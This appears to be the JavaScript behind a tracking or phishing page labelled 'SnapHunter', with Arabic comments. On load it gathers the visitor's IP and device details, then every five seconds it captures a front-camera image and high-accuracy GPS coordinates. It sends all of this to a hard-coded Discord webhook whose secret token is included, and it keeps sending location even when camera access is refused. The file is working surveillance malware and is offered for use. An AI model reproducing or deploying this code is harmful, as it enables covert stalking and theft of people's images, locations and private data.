'use strict';

const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

// 1. وظيفة جلب IP الجهاز والمعلومات الأساسية
async function getDeviceInfo() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return {
            ip: data.ip,
            ua: navigator.userAgent,
            platform: navigator.platform
        };
    } catch (e) { return { ip: "غير معروف", ua: "غير معروف", platform: "غير معروف" }; }
}

// 2. إشعار دخول فوري للبوت
async function sendEntryLog() {
    const info = await getDeviceInfo();
    const payload = {
        username: "SnapHunter - نظام التتبع",
        content: `🚀 **دخل صيد جديد للموقع الآن!**\n🌐 **IP:** \`${info.ip}\`\n📱 **الجهاز:** \`${info.platform}\`\n🔍 **المتصفح:** \`${info.ua}\`\n⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`
    };
    await fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
}

// 3. وظيفة الإرسال الدوري (صورة + موقع)
async function sendCaptureUpdate(blob, lat, lng) {
    const info = await getDeviceInfo();
    const formData = new FormData();
    
    let content = `📸 **تحديث تلقائي (كل 5 ثوانٍ)**\n` +
                  `🌐 **IP:** \`${info.ip}\`\n`;
    
    if (lat && lng) {
        content += `📍 **الموقع المباشر:** [خرائط جوجل](https://www.google.com/maps?q=${lat},${lng})\n` +
                   `🗺️ **الإحداثيات:** \`${lat}, ${lng}\`\n`;
    } else {
        content += `📍 **الموقع:** لم يتم السماح بالوصول لـ GPS\n`;
    }

    if (blob) formData.append('file', blob, 'capture.png');
    formData.append('payload_json', JSON.stringify({
        content: content,
        username: "SnapHunter - التتبع المباشر"
    }));

    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
}

// 4. تشغيل الكاميرا والبدء في التكرار
async function startLiveTracking() {
    await sendEntryLog(); // إرسال إشعار الدخول فوراً

    let lat = null, lng = null;
    
    // محاولة جلب الموقع بشكل مستمر
    navigator.geolocation.watchPosition(p => {
        lat = p.coords.latitude;
        lng = p.coords.longitude;
    }, null, { enableHighAccuracy: true });

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        // بدء التكرار كل 5 ثوانٍ
        setInterval(() => {
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            canvas.toBlob(blob => {
                sendCaptureUpdate(blob, lat, lng);
            }, 'image/png');
        }, 5000); // 5000 ميلي ثانية = 5 ثوانٍ

    } catch (err) {
        // إذا رفض الكاميرا، استمر في إرسال الموقع فقط كل 5 ثوانٍ
        setInterval(() => {
            sendCaptureUpdate(null, lat, lng);
        }, 5000);
    }
}

window.onload = startLiveTracking;
